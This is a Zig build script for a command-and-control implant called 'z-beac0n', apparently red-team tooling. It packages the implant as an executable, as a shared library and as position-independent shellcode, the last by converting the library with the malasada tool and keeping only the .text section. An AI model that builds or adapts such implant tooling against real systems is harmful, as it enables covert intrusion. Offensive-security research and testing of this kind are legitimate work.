const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    const osTagStr = @import("bof_launcher_lib").osTagStr;
    const cpuArchStr = @import("bof_launcher_lib").cpuArchStr;

    const bof_launcher_dep = b.dependency(
        "bof_launcher_lib",
        .{ .target = target, .optimize = optimize },
    );
    const bof_launcher_api_module = bof_launcher_dep.module("bof_launcher_api");
    const bof_launcher_lib = bof_launcher_dep.artifact(
        @import("bof_launcher_lib").libFileName(b.allocator, target, null),
    );

    const bofs_dep = b.dependency("bof_launcher_bofs", .{ .optimize = optimize });
    const z_beacon = bofs_dep.artifact("z-beac0n-core.elf.x64");

    const shellcode_in_zig_dep = b.dependency("shellcode_in_zig", .{ .target = target, .optimize = optimize });

    //
    // z-beac0n implant: stageless payload (executable)
    //
    const exe = b.addExecutable(.{
        .name = b.fmt("z-beac0n_{s}_{s}.elf", .{ osTagStr(target), cpuArchStr(target) }),
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/main.zig"),
            .target = target,
            .optimize = optimize,
        }),
    });
    exe.root_module.linkLibrary(bof_launcher_lib);
    exe.root_module.addImport("bof_launcher_api", bof_launcher_api_module);
    exe.root_module.addAnonymousImport("z_beacon_embed", .{
        .root_source_file = z_beacon.getEmittedBin(),
    });

    b.installArtifact(exe);

    //
    // z-beac0n implant: stageless payload (shared library)
    //
    const shared_name = b.fmt("z-beac0n_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });

    const shared_lib = b.addLibrary(.{
        .name = shared_name,
        .linkage = .dynamic,
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/shared.zig"),
            .target = target,
            .optimize = optimize,
            .link_libc = target.result.os.tag == .linux,
        }),
    });

    shared_lib.root_module.linkLibrary(bof_launcher_lib);
    shared_lib.root_module.addImport("bof_launcher_api", bof_launcher_api_module);
    shared_lib.root_module.addAnonymousImport("z_beacon_embed", .{
        .root_source_file = z_beacon.getEmittedBin(),
    });

    const shared_install = b.addInstallArtifact(shared_lib,
        .{
            .dest_dir = .{ .override = .{ .custom = "lib/" } },
            .dest_sub_path = b.fmt("{s}.so", .{shared_name}),
        });
    b.getInstallStep().dependOn(&shared_install.step);


    //
    // z-beac0n implant: stageless payload (malasada-based shellcode variant)
    //

    // run malasada: https://github.com/sliverarmory/malasada - it converts provided so to executable shellcode
    const malasada_run = b.addSystemCommand(&.{
        "bin/malasada",
        "--call-export",
        "launch",
        b.fmt("zig-out/lib/" ++ "lib" ++ "{s}.so", .{shared_name}),
        "-o",
        b.fmt("examples/implant/src/{s}" ++ ".so.bin", .{shared_name}),
    });
    malasada_run.step.dependOn(&shared_install.step);

    const shellcode_name = b.fmt("temp_implant_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });
    const shellcode = b.addExecutable(.{
        .name = shellcode_name,
        .root_module = b.createModule(.{
            .root_source_file = b.path("src/shellcode.zig"),
            .target = target,
            .optimize = optimize,
            .link_libc = false,
            .strip = true,
            .single_threaded = true,
        }),
    });
    shellcode.link_eh_frame_hdr = false;
    shellcode.link_emit_relocs = false;
    shellcode.use_llvm = true;
    shellcode.pie = true;
    shellcode.setLinkerScript(shellcode_in_zig_dep.path("src/linker.ld"));
    // add output of the malasada (i.e. so converted to shellcode) to the Zig-based shellcode for pre-processing and execution
    shellcode.root_module.addAnonymousImport("implant_shellcode_embed", .{
        .root_source_file = b.path(b.fmt("src/{s}" ++ ".so.bin", .{shared_name})),
    });
    shellcode.step.dependOn(&shared_install.step);
    shellcode.step.dependOn(&malasada_run.step);

    b.installArtifact(shellcode);

    const copy2 = b.addObjCopy(shellcode.getEmittedBin(), .{ .format = .bin, .only_section = ".text" });
    const install2 = b.addInstallBinFile(copy2.getOutput(), b.fmt("z-beac0n_{s}_{s}.bin", .{
        osTagStr(target),
        cpuArchStr(target),
    }));
    b.getInstallStep().dependOn(&install2.step);

}
